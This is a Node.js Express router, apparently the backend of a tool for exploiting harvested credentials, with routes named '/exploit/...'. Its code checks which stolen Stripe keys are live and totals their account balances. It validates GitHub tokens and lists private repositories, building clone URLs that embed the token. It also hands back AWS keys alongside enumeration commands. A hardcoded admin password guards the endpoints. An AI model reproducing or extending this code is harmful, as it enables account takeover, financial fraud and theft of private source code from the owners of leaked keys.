const express = require('express');
const router = express.Router();
const axios = require('axios');

// Admin auth
const adminAuth = (req, res, next) => {
  const adminKey = req.headers['x-admin-key'] || req.headers['X-Admin-Key'] || req.body.adminKey;
  if (adminKey === 'Peace@25') {
    next();
  } else {
    res.status(403).json({ error: 'Access denied' });
  }
};

// Auto-Tester - Test all keys
router.post('/exploit/test-all', adminAuth, async (req, res) => {
  try {
    const { credentials, batchSize = 100 } = req.body;
    const results = [];

    console.log(`ðŸ§ª Testing ${credentials.length} credentials in batches of ${batchSize}...`);

    // Limit to 500 max to prevent timeout
    const credentialsToTest = credentials.slice(0, 500);

    for (const cred of credentialsToTest) {
      try {
        let testResult = { id: cred.id, type: cred.credential_type, status: 'unknown' };

        // Test Stripe keys
        if (cred.credential_type === 'stripe_key' && cred.api_key) {
          try {
            const response = await axios.get('https://api.stripe.com/v1/balance', {
              auth: { username: cred.api_key, password: '' },
              timeout: 5000
            });
            testResult.status = 'LIVE';
            testResult.balance = response.data.available[0]?.amount || 0;
            testResult.currency = response.data.available[0]?.currency || 'usd';
          } catch (e) {
            testResult.status = 'DEAD';
            testResult.error = e.response?.status || 'timeout';
          }
        }

        // Test GitHub tokens
        if (cred.credential_type === 'github_token' && cred.token) {
          try {
            const response = await axios.get('https://api.github.com/user', {
              headers: { 'Authorization': `token ${cred.token}` },
              timeout: 5000
            });
            testResult.status = 'ACTIVE';
            testResult.username = response.data.login;
            testResult.repos = response.data.public_repos + response.data.total_private_repos;
          } catch (e) {
            testResult.status = 'INVALID';
          }
        }

        // Test AWS keys (basic check)
        if (cred.credential_type === 'aws_key' && cred.api_key) {
          testResult.status = 'NEEDS_SECRET';
          testResult.note = 'AWS requires both access key and secret key';
        }

        results.push(testResult);
      } catch (error) {
        results.push({ id: cred.id, status: 'error', error: error.message });
      }
    }

    res.json({
      success: true,
      tested: results.length,
      total: credentials.length,
      limited: credentials.length > 500,
      results: results,
      summary: {
        live: results.filter(r => r.status === 'LIVE').length,
        dead: results.filter(r => r.status === 'DEAD').length,
        active: results.filter(r => r.status === 'ACTIVE').length,
        unknown: results.filter(r => r.status === 'unknown').length
      }
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Balance Checker - Check Stripe balances
router.post('/exploit/check-balances', adminAuth, async (req, res) => {
  try {
    const { credentials, batchSize = 100 } = req.body;
    const stripeKeys = credentials.filter(c => c.credential_type === 'stripe_key' && c.api_key);
    const results = [];
    let totalBalance = 0;

    console.log(`ðŸ’° Checking ${stripeKeys.length} Stripe keys in batches of ${batchSize}...`);

    // Process in batches to prevent crash
    for (let i = 0; i < stripeKeys.length; i += batchSize) {
      const batch = stripeKeys.slice(i, i + batchSize);
      console.log(`Processing batch ${Math.floor(i / batchSize) + 1}/${Math.ceil(stripeKeys.length / batchSize)}`);

      // Process batch with rate limiting
      const batchPromises = batch.map(async (key, index) => {
        // Rate limit: 1 request per 100ms
        await new Promise(resolve => setTimeout(resolve, index * 100));
        
        try {
          const response = await axios.get('https://api.stripe.com/v1/balance', {
            auth: { username: key.api_key, password: '' },
            timeout: 5000
          });
          
          const balance = response.data.available[0]?.amount || 0;
          const currency = response.data.available[0]?.currency || 'usd';
          
          return {
            id: key.id,
            key: key.api_key.substring(0, 20) + '...',
            status: 'LIVE',
            balance: balance / 100,
            currency: currency.toUpperCase(),
            source: key.source,
            url: key.url
          };
        } catch (error) {
          return {
            id: key.id,
            key: key.api_key.substring(0, 20) + '...',
            status: 'DEAD',
            error: error.response?.status || 'timeout'
          };
        }
      });

      const batchResults = await Promise.all(batchPromises);
      results.push(...batchResults);
      
      // Calculate balance from this batch
      batchResults.forEach(r => {
        if (r.balance) totalBalance += r.balance;
      });

      // Small delay between batches
      if (i + batchSize < stripeKeys.length) {
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }

    res.json({
      success: true,
      checked: results.length,
      totalBalance: totalBalance,
      results: results,
      summary: {
        live: results.filter(r => r.status === 'LIVE').length,
        dead: results.filter(r => r.status === 'DEAD').length,
        totalValue: totalBalance
      }
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// AWS Scanner - List AWS resources
router.post('/exploit/scan-aws', adminAuth, async (req, res) => {
  try {
    const { credentials } = req.body;
    const awsKeys = credentials.filter(c => c.credential_type === 'aws_key');

    res.json({
      success: true,
      message: 'AWS scanning requires AWS CLI or SDK setup',
      awsKeys: awsKeys.length,
      instructions: [
        '1. Export AWS credentials: export AWS_ACCESS_KEY_ID=AKIA...',
        '2. Export secret key: export AWS_SECRET_ACCESS_KEY=...',
        '3. Run: aws ec2 describe-instances',
        '4. Run: aws s3 ls',
        '5. Run: aws iam list-users'
      ],
      keys: awsKeys.map(k => ({
        id: k.id,
        key: k.api_key,
        source: k.source,
        url: k.url
      }))
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// GitHub Cloner - List private repos
router.post('/exploit/clone-github', adminAuth, async (req, res) => {
  try {
    const { credentials } = req.body;
    const githubTokens = credentials.filter(c => c.credential_type === 'github_token' && c.token);
    const results = [];

    console.log(`ðŸ“¦ Scanning ${githubTokens.length} GitHub tokens...`);

    for (const token of githubTokens) { // Scan ALL tokens
      try {
        // Get user info
        const userResponse = await axios.get('https://api.github.com/user', {
          headers: { 'Authorization': `token ${token.token}` },
          timeout: 5000
        });

        // Get private repos
        const reposResponse = await axios.get('https://api.github.com/user/repos?type=private&per_page=100', {
          headers: { 'Authorization': `token ${token.token}` },
          timeout: 5000
        });

        results.push({
          id: token.id,
          username: userResponse.data.login,
          status: 'ACTIVE',
          privateRepos: reposResponse.data.length,
          repos: reposResponse.data.map(r => ({
            name: r.full_name,
            cloneUrl: r.clone_url.replace('https://', `https://${token.token}@`),
            size: r.size,
            language: r.language
          }))
        });
      } catch (error) {
        results.push({
          id: token.id,
          status: 'INVALID',
          error: error.message
        });
      }
    }

    res.json({
      success: true,
      checked: results.length,
      results: results,
      summary: {
        active: results.filter(r => r.status === 'ACTIVE').length,
        totalRepos: results.reduce((sum, r) => sum + (r.privateRepos || 0), 0)
      }
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

module.exports = router;
